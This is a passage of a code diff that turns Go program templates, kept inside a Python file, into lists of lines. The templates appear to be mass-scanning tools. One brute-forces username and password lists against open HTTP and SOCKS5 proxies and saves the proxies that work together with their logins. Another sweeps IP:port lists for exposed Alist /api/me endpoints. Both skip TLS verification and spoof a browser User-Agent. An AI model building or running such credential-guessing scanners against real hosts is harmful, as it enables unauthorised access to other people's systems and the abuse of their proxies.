+    "	if len(os.Args) < 3 {",
+    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
+    "		os.Exit(1)",
+    "	}",
+    "	inputFile, outputFile := os.Args[1], os.Args[2]",
+    "	sigChan := make(chan os.Signal, 1)",
+    "	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)",
+    "	go func() {",
+    "		<-sigChan",
+    "		fmt.Println(\"\\nGracefully shutting down...\")",
+    "		os.Exit(0)",
+    "	}()",
+    "    go memoryMonitor()",
+    "	batch, err := os.Open(inputFile)",
+    "	if err != nil {",
+    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
+    "		return",
+    "	}",
+    "	defer batch.Close()",
+    "	totalLines, _ := countLines(inputFile)",
+    "	go func() {",
+    "		ticker := time.NewTicker(500 * time.Millisecond)",
+    "		defer ticker.Stop()",
+    "		startTime := time.Now()",
+    "		for {",
+    "			current := atomic.LoadInt64(&completedCount)",
+    "			if totalLines > 0 {",
+    "				percentage := float64(current) / float64(totalLines) * 100",
+    "				bar := strings.Repeat(\"=\", int(percentage/2)) + strings.Repeat(\"-\", 50-int(percentage/2))",
+    "				elapsed := time.Since(startTime).Seconds()",
+    "				var eta float64",
+    "				if current > 0 {",
+    "					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)",
+    "				}",
+    "				fmt.Fprintf(os.Stdout, \"\\r[%s] %.2f%% (%d/%d) [%v<%v]\", bar, percentage, current, totalLines, ",
+    "					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)",
+    "			}",
+    "			if current >= int64(totalLines) {",
+    "				fmt.Fprintf(os.Stdout, \"\\n\")",
+    "				return",
+    "			}",
+    "			<-ticker.C",
+    "		}",
+    "	}()",
+    "	usernames, passwords := {user_list}, {pass_list}",
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
+    "	if err != nil {",
+    "		fmt.Println(\"无法打开输出文件:\", err)",
+    "		return",
+    "	}",
+    "	defer outFile.Close()",
+    "	tasks := make(chan string, {semaphore_size})",
+    "	var wg sync.WaitGroup",
+    "	for i := 0; i < {semaphore_size}; i++ {",
+    "		wg.Add(1)",
+    "		go worker(tasks, outFile, &wg, usernames, passwords)",
+    "	}",
+    "	scanner := bufio.NewScanner(batch)",
+    "	for scanner.Scan() {",
+    "        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }",
+    "		line := strings.TrimSpace(scanner.Text())",
+    "		if line != \"\" { tasks <- line }",
+    "	}",
+    "	close(tasks)",
+    "	wg.Wait()",
+    "}",
+]
 
-PROXY_GO_TEMPLATE = """package main
-import (
-	"bufio"
-	"context"
-	"crypto/tls"
-	"fmt"
-	"io"
-	"io/ioutil"
-	"net"
-	"net/http"
-	"net/url"
-	"os"
-	"os/signal"
-	"runtime"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-	"golang.org/x/net/proxy"
-)
-var (
-	proxyType    = "{proxy_type}"
-	authMode     = {auth_mode}
-	testURL      = "http://myip.ipip.net"
-	realIP       = ""
-	completedCount int64
-    isMemoryThrottled int32
-)
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-func memoryMonitor() {
-	var baselineMem uint64
-	var m runtime.MemStats
-	time.Sleep(2 * time.Second)
-	runtime.ReadMemStats(&m)
-	baselineMem = m.Sys
-	highWatermark := baselineMem + 200*1024*1024
-	lowWatermark := baselineMem + 100*1024*1024
-	ticker := time.NewTicker(2 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		runtime.ReadMemStats(&m)
-		if m.Sys >= highWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 1)
-		} else if m.Sys < lowWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 0)
-		}
-	}
-}
-func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {
-	defer wg.Done()
-	httpClient := &http.Client{ Timeout: {timeout} * time.Second }
-	for proxyAddr := range tasks {
-		processProxy(proxyAddr, outputFile, httpClient)
-		atomic.AddInt64(&completedCount, 1)
-	}
-}
-func processProxy(proxyAddr string, outputFile *os.File, httpClient *http.Client) {
-	var found bool
-	checkAndFormat := func(auth *proxy.Auth) {
-        if found { return }
-		success, _ := checkConnection(proxyAddr, auth, httpClient)
-		if success {
-            found = true
-			var result string
-			if auth != nil && auth.User != "" {
-				result = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
-			} else {
-				result = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
-			}
-			outputFile.WriteString(result + "\\n")
-		}
-	}
-	switch authMode {
-	case 1:
-		checkAndFormat(nil)
-	case 2:
-		usernames := {user_list}
-		passwords := {pass_list}
-		for _, user := range usernames {
-			for _, pass := range passwords {
-				if found { return }
-				auth := &proxy.Auth{User: user, Password: pass}
-				checkAndFormat(auth)
-			}
-		}
-	case 3:
-		credentials := {creds_list}
-		for _, cred := range credentials {
-			if found { return }
-			parts := strings.SplitN(cred, ":", 2)
-			if len(parts) == 2 {
-				auth := &proxy.Auth{User: parts[0], Password: parts[1]}
-				checkAndFormat(auth)
-			}
-		}
-	}
-}
-func getPublicIP(targetURL string) (string, error) {
-	client := &http.Client{Timeout: 15 * time.Second}
-	req, err := http.NewRequest("GET", targetURL, nil)
-	if err != nil { return "", err }
-	req.Header.Set("User-Agent", "curl/7.79.1")
-	resp, err := client.Do(req)
-	if err != nil { return "", err }
-	defer resp.Body.Close()
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil { return "", err }
-	ipString := string(body)
-	if strings.Contains(ipString, "当前 IP：") {
-		parts := strings.Split(ipString, "：")
-		if len(parts) > 1 {
-			ipParts := strings.Split(parts[1], " ")
-			return ipParts[0], nil
-		}
-	}
-	return strings.TrimSpace(ipString), nil
-}
-func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client) (bool, error) {
-	transport := &http.Transport{ 
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-		DisableKeepAlives: true,
-	}
-	timeout := {timeout} * time.Second
-	if proxyType == "http" || proxyType == "https" {
-		var proxyURLString string
-		if auth != nil && auth.User != "" {
-			proxyURLString = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
-		} else {
-			proxyURLString = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
-		}
-		proxyURL, err := url.Parse(proxyURLString)
-		if err != nil { return false, err }
-		transport.Proxy = http.ProxyURL(proxyURL)
-	} else {
-		dialer, err := proxy.SOCKS5("tcp", proxyAddr, auth, &net.Dialer{
-			Timeout:   timeout,
-			KeepAlive: 30 * time.Second,
-		})
-		if err != nil { return false, err }
-		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
-			return dialer.Dial(network, addr)
-		}
-	}
-	httpClient.Transport = transport
-	req, err := http.NewRequest("GET", testURL, nil)
-	if err != nil { return false, err }
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
-	resp, err := httpClient.Do(req)
-	if err != nil { 
-        if resp != nil { resp.Body.Close() }
-        return false, err 
-    }
-	defer resp.Body.Close()
-	body, readErr := ioutil.ReadAll(resp.Body)
-	if readErr != nil { return false, fmt.Errorf("无法读取响应") }
-	proxyIP := string(body)
-	if strings.Contains(proxyIP, "当前 IP：") {
-		parts := strings.Split(proxyIP, "：")
-		if len(parts) > 1 {
-			ipParts := strings.Split(parts[1], " ")
-			proxyIP = ipParts[0]
-		}
-	}
-	proxyIP = strings.TrimSpace(proxyIP)
-	if realIP == "UNKNOWN" || proxyIP == "" { return false, fmt.Errorf("无法获取IP验证") }
-	if proxyIP == realIP { return false, fmt.Errorf("透明代理") }
-	return true, nil
-}
-func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("Usage: ./program <inputFile> <outputFile>")
-		os.Exit(1)
-	}
-	inputFile, outputFile := os.Args[1], os.Args[2]
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
-		os.Exit(0)
-	}()
-    go memoryMonitor()
-	var err error
-	realIP, err = getPublicIP(testURL)
-	if err != nil {
-		realIP = "UNKNOWN"
-	}
-	proxies, err := os.Open(inputFile)
-	if err != nil {
-		return
-	}
-	defer proxies.Close()
-	totalLines, _ := countLines(inputFile)
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		startTime := time.Now()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				percentage := float64(current) / float64(totalLines) * 100
-				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
-				elapsed := time.Since(startTime).Seconds()
-				var eta float64
-				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
-				}
-				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
-					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		return
-	}
-	defer outFile.Close()
-	tasks := make(chan string, {semaphore_size})
-	var wg sync.WaitGroup
-	for i := 0; i < {semaphore_size}; i++ {
-		wg.Add(1)
-		go worker(tasks, outFile, &wg)
-	}
-	scanner := bufio.NewScanner(proxies)
-	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
-		proxyAddr := strings.TrimSpace(scanner.Text())
-		if proxyAddr != "" { tasks <- proxyAddr }
-	}
-	close(tasks)
-	wg.Wait()
-}
-"""
+PROXY_GO_TEMPLATE_LINES = [
+    "package main",
+    "import (",
+    "	\"bufio\"",
+    "	\"context\"",
+    "	\"crypto/tls\"",
+    "	\"fmt\"",
+    "	\"io\"",
+    "	\"io/ioutil\"",
+    "	\"net\"",
+    "	\"net/http\"",
+    "	\"net/url\"",
+    "	\"os\"",
+    "	\"os/signal\"",
+    "	\"runtime\"",
+    "	\"strings\"",
+    "	\"sync\"",
+    "	\"sync/atomic\"",
+    "	\"syscall\"",
+    "	\"time\"",
+    "	\"golang.org/x/net/proxy\"",
+    ")",
+    "var (",
+    "	proxyType    = \"{proxy_type}\"",
+    "	authMode     = {auth_mode}",
+    "	testURL      = \"http://myip.ipip.net\"",
+    "	realIP       = \"\"",
+    "	completedCount int64",
+    "    isMemoryThrottled int32",
+    ")",
+    "func countLines(filePath string) (int, error) {",
+    "	file, err := os.Open(filePath)",
+    "	if err != nil { return 0, err }",
+    "	defer file.Close()",
+    "	scanner := bufio.NewScanner(file)",
+    "	count := 0",
+    "	for scanner.Scan() { count++ }",
+    "	return count, scanner.Err()",
+    "}",
+    "func memoryMonitor() {",
+    "	var baselineMem uint64",
+    "	var m runtime.MemStats",
+    "	time.Sleep(2 * time.Second)",
+    "	runtime.ReadMemStats(&m)",
+    "	baselineMem = m.Sys",
+    "	highWatermark := baselineMem + 200*1024*1024",
+    "	lowWatermark := baselineMem + 100*1024*1024",
+    "	ticker := time.NewTicker(2 * time.Second)",
+    "	defer ticker.Stop()",
+    "	for range ticker.C {",
+    "		runtime.ReadMemStats(&m)",
+    "		if m.Sys >= highWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 1)",
+    "		} else if m.Sys < lowWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 0)",
+    "		}",
+    "	}",
+    "}",
+    "func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {",
+    "	defer wg.Done()",
+    "	httpClient := &http.Client{ Timeout: {timeout} * time.Second }",
+    "	for proxyAddr := range tasks {",
+    "		processProxy(proxyAddr, outputFile, httpClient)",
+    "		atomic.AddInt64(&completedCount, 1)",
+    "	}",
+    "}",
+    "func processProxy(proxyAddr string, outputFile *os.File, httpClient *http.Client) {",
+    "	var found bool",
+    "	checkAndFormat := func(auth *proxy.Auth) {",
+    "        if found { return }",
+    "		success, _ := checkConnection(proxyAddr, auth, httpClient)",
+    "		if success {",
+    "            found = true",
+    "			var result string",
+    "			if auth != nil && auth.User != \"\" {",
+    "				result = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
+    "			} else {",
+    "				result = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
+    "			}",
+    "			outputFile.WriteString(result + \"\\n\")",
+    "		}",
+    "	}",
+    "	switch authMode {",
+    "	case 1:",
+    "		checkAndFormat(nil)",
+    "	case 2:",
+    "		usernames := {user_list}",
+    "		passwords := {pass_list}",
+    "		for _, user := range usernames {",
+    "			for _, pass := range passwords {",
+    "				if found { return }",
+    "				auth := &proxy.Auth{User: user, Password: pass}",
+    "				checkAndFormat(auth)",
+    "			}",
+    "		}",
+    "	case 3:",
+    "		credentials := {creds_list}",
+    "		for _, cred := range credentials {",
+    "			if found { return }",
+    "			parts := strings.SplitN(cred, \":\", 2)",
+    "			if len(parts) == 2 {",
+    "				auth := &proxy.Auth{User: parts[0], Password: parts[1]}",
+    "				checkAndFormat(auth)",
+    "			}",
+    "		}",
+    "	}",
+    "}",
+    "func getPublicIP(targetURL string) (string, error) {",
+    "	client := &http.Client{Timeout: 15 * time.Second}",
+    "	req, err := http.NewRequest(\"GET\", targetURL, nil)",
+    "	if err != nil { return \"\", err }",
+    "	req.Header.Set(\"User-Agent\", \"curl/7.79.1\")",
+    "	resp, err := client.Do(req)",
+    "	if err != nil { return \"\", err }",
+    "	defer resp.Body.Close()",
+    "	body, err := ioutil.ReadAll(resp.Body)",
+    "	if err != nil { return \"\", err }",
+    "	ipString := string(body)",
+    "	if strings.Contains(ipString, \"当前 IP：\") {",
+    "		parts := strings.Split(ipString, \"：\")",
+    "		if len(parts) > 1 {",
+    "			ipParts := strings.Split(parts[1], \" \")",
+    "			return ipParts[0], nil",
+    "		}",
+    "	}",
+    "	return strings.TrimSpace(ipString), nil",
+    "}",
+    "func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client) (bool, error) {",
+    "	transport := &http.Transport{ ",
+    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
+    "		DisableKeepAlives: true,",
+    "	}",
+    "	timeout := {timeout} * time.Second",
+    "	if proxyType == \"http\" || proxyType == \"https\" {",
+    "		var proxyURLString string",
+    "		if auth != nil && auth.User != \"\" {",
+    "			proxyURLString = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
+    "		} else {",
+    "			proxyURLString = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
+    "		}",
+    "		proxyURL, err := url.Parse(proxyURLString)",
+    "		if err != nil { return false, err }",
+    "		transport.Proxy = http.ProxyURL(proxyURL)",
+    "	} else {",
+    "		dialer, err := proxy.SOCKS5(\"tcp\", proxyAddr, auth, &net.Dialer{",
+    "			Timeout:   timeout,",
+    "			KeepAlive: 30 * time.Second,",
+    "		})",
+    "		if err != nil { return false, err }",
+    "		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {",
+    "			return dialer.Dial(network, addr)",
+    "		}",
+    "	}",
+    "	httpClient.Transport = transport",
+    "	req, err := http.NewRequest(\"GET\", testURL, nil)",
+    "	if err != nil { return false, err }",
+    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\")",
+    "	resp, err := httpClient.Do(req)",
+    "	if err != nil { ",
+    "        if resp != nil { resp.Body.Close() }",
+    "        return false, err ",
+    "    }",
+    "	defer resp.Body.Close()",
+    "	body, readErr := ioutil.ReadAll(resp.Body)",
+    "	if readErr != nil { return false, fmt.Errorf(\"无法读取响应\") }",
+    "	proxyIP := string(body)",
+    "	if strings.Contains(proxyIP, \"当前 IP：\") {",
+    "		parts := strings.Split(proxyIP, \"：\")",
+    "		if len(parts) > 1 {",
+    "			ipParts := strings.Split(parts[1], \" \")",
+    "			proxyIP = ipParts[0]",
+    "		}",
+    "	}",
+    "	proxyIP = strings.TrimSpace(proxyIP)",
+    "	if realIP == \"UNKNOWN\" || proxyIP == \"\" { return false, fmt.Errorf(\"无法获取IP验证\") }",
+    "	if proxyIP == realIP { return false, fmt.Errorf(\"透明代理\") }",
+    "	return true, nil",
+    "}",
+    "func main() {",
+    "	if len(os.Args) < 3 {",
+    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
+    "		os.Exit(1)",
+    "	}",
+    "	inputFile, outputFile := os.Args[1], os.Args[2]",
+    "	sigChan := make(chan os.Signal, 1)",
+    "	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)",
+    "	go func() {",
+    "		<-sigChan",
+    "		fmt.Println(\"\\nGracefully shutting down...\")",
+    "		os.Exit(0)",
+    "	}()",
+    "    go memoryMonitor()",
+    "	var err error",
+    "	realIP, err = getPublicIP(testURL)",
+    "	if err != nil {",
+    "		realIP = \"UNKNOWN\"",
+    "	}",
+    "	proxies, err := os.Open(inputFile)",
+    "	if err != nil {",
+    "		return",
+    "	}",
+    "	defer proxies.Close()",
+    "	totalLines, _ := countLines(inputFile)",
+    "	go func() {",
+    "		ticker := time.NewTicker(500 * time.Millisecond)",
+    "		defer ticker.Stop()",
+    "		startTime := time.Now()",
+    "		for {",
+    "			current := atomic.LoadInt64(&completedCount)",
+    "			if totalLines > 0 {",
+    "				percentage := float64(current) / float64(totalLines) * 100",
+    "				bar := strings.Repeat(\"=\", int(percentage/2)) + strings.Repeat(\"-\", 50-int(percentage/2))",
+    "				elapsed := time.Since(startTime).Seconds()",
+    "				var eta float64",
+    "				if current > 0 {",
+    "					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)",
+    "				}",
+    "				fmt.Fprintf(os.Stdout, \"\\r[%s] %.2f%% (%d/%d) [%v<%v]\", bar, percentage, current, totalLines, ",
+    "					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)",
+    "			}",
+    "			if current >= int64(totalLines) {",
+    "				fmt.Fprintf(os.Stdout, \"\\n\")",
+    "				return",
+    "			}",
+    "			<-ticker.C",
+    "		}",
+    "	}()",
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
+    "	if err != nil {",
+    "		return",
+    "	}",
+    "	defer outFile.Close()",
+    "	tasks := make(chan string, {semaphore_size})",
+    "	var wg sync.WaitGroup",
+    "	for i := 0; i < {semaphore_size}; i++ {",
+    "		wg.Add(1)",
+    "		go worker(tasks, outFile, &wg)",
+    "	}",
+    "	scanner := bufio.NewScanner(proxies)",
+    "	for scanner.Scan() {",
+    "        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }",
+    "		proxyAddr := strings.TrimSpace(scanner.Text())",
+    "		if proxyAddr != \"\" { tasks <- proxyAddr }",
+    "	}",
+    "	close(tasks)",
+    "	wg.Wait()",
+    "}",
+]
 
-ALIST_GO_TEMPLATE = """package main
-import (
-	"bufio"
-	"context"
-	"crypto/tls"
-	"encoding/json"
-	"fmt"
-	"io"
-	"net"
-	"net/http"
-	"os"
-	"os/signal"
-	"runtime"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-)
-var completedCount int64
-var isMemoryThrottled int32
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-func memoryMonitor() {
-	var baselineMem uint64
-	var m runtime.MemStats
-	time.Sleep(2 * time.Second)
-	runtime.ReadMemStats(&m)
-	baselineMem = m.Sys
-	highWatermark := baselineMem + 200*1024*1024
-	lowWatermark := baselineMem + 100*1024*1024
-	ticker := time.NewTicker(2 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		runtime.ReadMemStats(&m)
-		if m.Sys >= highWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 1)
-		} else if m.Sys < lowWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 0)
-		}
-	}
-}
-func createHttpClient() *http.Client {
-	tr := &http.Transport{
-		Proxy: http.ProxyFromEnvironment,
-		DialContext: (&net.Dialer{
-			Timeout:   {timeout} * time.Second,
-			KeepAlive: 0,
-		}).DialContext,
-		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
-		TLSHandshakeTimeout:   {timeout} * time.Second,
-		ResponseHeaderTimeout: {timeout} * time.Second,
-		ExpectContinueTimeout: 1 * time.Second,
-		ForceAttemptHTTP2:     false,
-		DisableKeepAlives: true,
-	}
-	return &http.Client{
-		Transport: tr,
-		Timeout:   ({timeout} + 1) * time.Second,
-	}
-}
-func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {
-	defer wg.Done()
-	httpClient := createHttpClient()
-	for ipPort := range tasks {
-		processIP(ipPort, file, httpClient)
-		atomic.AddInt64(&completedCount, 1)
-	}
-}
-func processIP(ipPort string, file *os.File, httpClient *http.Client) {
-	parts := strings.SplitN(ipPort, ":", 2)
-	if len(parts) != 2 { return }
-	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
-	for _, proto := range []string{"http", "https"} {
-		base := fmt.Sprintf("%s://%s:%s", proto, ip, port)
-		testURL := base + "/api/me"
-		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)
-		defer cancel()
-		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
-		if err != nil { continue }
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		req.Header.Set("Connection", "close")
-		resp, err := httpClient.Do(req)
-		if err != nil {
-			if resp != nil { resp.Body.Close() }
-			continue
-		}
-		if isValidResponse(resp) {
-			file.WriteString(base + "\\n")
-			resp.Body.Close()
-			return
-		}
-		resp.Body.Close()
-	}
-}
-func isValidResponse(resp *http.Response) bool {
-	if resp == nil { return false }
-	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
-	if err != nil { return false }
-	var data map[string]interface{}
-	if err := json.Unmarshal(body, &data); err != nil { return false }
-	if v, ok := data["code"]; ok {
-		switch t := v.(type) {
-		case float64:
-			return int(t) == 200
-		case string:
-			return t == "200"
-		}
-	}
-	return false
-}
-func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("Usage: ./program <inputFile> <outputFile>")
-		os.Exit(1)
-	}
-	inputFile, outputFile := os.Args[1], os.Args[2]
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
-		os.Exit(0)
-	}()
-    go memoryMonitor()
-	batch, err := os.Open(inputFile)
-	if err != nil { return }
-	defer batch.Close()
-	totalLines, _ := countLines(inputFile)
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		startTime := time.Now()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				percentage := float64(current) / float64(totalLines) * 100
-				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
-				elapsed := time.Since(startTime).Seconds()
-				var eta float64
-				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
-				}
-				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
-					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil { return }
-	defer outFile.Close()
-	tasks := make(chan string, {semaphore_size})
-	var wg sync.WaitGroup
-	for i := 0; i < {semaphore_size}; i++ {
-		wg.Add(1)
-		go worker(tasks, outFile, &wg)
-	}
-	scanner := bufio.NewScanner(batch)
-	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" {
-			fields := strings.Fields(line)
-			if len(fields) > 0 {
-				tasks <- fields[0]
-			}
-		}
-	}
-	close(tasks)
-	wg.Wait()
-}
-"""
+ALIST_GO_TEMPLATE_LINES = [
+    "package main",
+    "import (",
+    "	\"bufio\"",
+    "	\"context\"",
+    "	\"crypto/tls\"",
+    "	\"encoding/json\"",
+    "	\"fmt\"",
+    "	\"io\"",
+    "	\"net\"",
+    "	\"net/http\"",
+    "	\"os\"",
+    "	\"os/signal\"",
+    "	\"runtime\"",
+    "	\"strings\"",
+    "	\"sync\"",
+    "	\"sync/atomic\"",
+    "	\"syscall\"",
+    "	\"time\"",
+    ")",
+    "var completedCount int64",
+    "var isMemoryThrottled int32",
+    "func countLines(filePath string) (int, error) {",
+    "	file, err := os.Open(filePath)",
+    "	if err != nil { return 0, err }",
+    "	defer file.Close()",
+    "	scanner := bufio.NewScanner(file)",
+    "	count := 0",
+    "	for scanner.Scan() { count++ }",
+    "	return count, scanner.Err()",
+    "}",
+    "func memoryMonitor() {",
+    "	var baselineMem uint64",
+    "	var m runtime.MemStats",
+    "	time.Sleep(2 * time.Second)",
+    "	runtime.ReadMemStats(&m)",
+    "	baselineMem = m.Sys",
+    "	highWatermark := baselineMem + 200*1024*1024",
+    "	lowWatermark := baselineMem + 100*1024*1024",
+    "	ticker := time.NewTicker(2 * time.Second)",
+    "	defer ticker.Stop()",
+    "	for range ticker.C {",
+    "		runtime.ReadMemStats(&m)",
+    "		if m.Sys >= highWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 1)",
+    "		} else if m.Sys < lowWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 0)",
+    "		}",
+    "	}",
+    "}",
+    "func createHttpClient() *http.Client {",
+    "	tr := &http.Transport{",
+    "		Proxy: http.ProxyFromEnvironment,",
+    "		DialContext: (&net.Dialer{",
+    "			Timeout:   {timeout} * time.Second,",
+    "			KeepAlive: 0,",
+    "		}).DialContext,",
+    "		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},",
+    "		TLSHandshakeTimeout:   {timeout} * time.Second,",
+    "		ResponseHeaderTimeout: {timeout} * time.Second,",
+    "		ExpectContinueTimeout: 1 * time.Second,",
+    "		ForceAttemptHTTP2:     false,",
+    "		DisableKeepAlives: true,",
+    "	}",
+    "	return &http.Client{",
+    "		Transport: tr,",
+    "		Timeout:   ({timeout} + 1) * time.Second,",
+    "	}",
+    "}",
+    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {",
+    "	defer wg.Done()",
+    "	httpClient := createHttpClient()",
+    "	for ipPort := range tasks {",
+    "		processIP(ipPort, file, httpClient)",
+    "		atomic.AddInt64(&completedCount, 1)",
+    "	}",
+    "}",
+    "func processIP(ipPort string, file *os.File, httpClient *http.Client) {",
+    "	parts := strings.SplitN(ipPort, \":\", 2)",
+    "	if len(parts) != 2 { return }",
+    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
+    "	for _, proto := range []string{\"http\", \"https\"} {",
+    "		base := fmt.Sprintf(\"%s://%s:%s\", proto, ip, port)",
+    "		testURL := base + \"/api/me\"",
+    "		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)",
+    "		defer cancel()",
+    "		req, err := http.NewRequestWithContext(ctx, \"GET\", testURL, nil)",
+    "		if err != nil { continue }",
+    "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
+    "		req.Header.Set(\"Connection\", \"close\")",
+    "		resp, err := httpClient.Do(req)",
+    "		if err != nil {",
+    "			if resp != nil { resp.Body.Close() }",
+    "			continue",
+    "		}",
+    "		if isValidResponse(resp) {",
+    "			file.WriteString(base + \"\\n\")",
+    "			resp.Body.Close()",
+    "			return",
+    "		}",
+    "		resp.Body.Close()",
+    "	}",
+    "}",
+    "func isValidResponse(resp *http.Response) bool {",
+    "	if resp == nil { return false }",
+    "	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))",
+    "	if err != nil { return false }",
+    "	var data map[string]interface{}",
+    "	if err := json.Unmarshal(body, &data); err != nil { return false }",
+    "	if v, ok := data[\"code\"]; ok {",
+    "		switch t := v.(type) {",
+    "		case float64:",
+    "			return int(t) == 200",
+    "		case string:",
+    "			return t == \"200\"",
+    "		}",
+    "	}",
+    "	return false",
+    "}",
+    "func main() {",
+    "	if len(os.Args) < 3 {",
+    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
+    "		os.Exit(1)",
+    "	}",
+    "	inputFile, outputFile := os.Args[1], os.Args[2]",
+    "	sigChan := make(chan os.Signal, 1)",
+    "	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)",
+    "	go func() {",
+    "		<-sigChan",
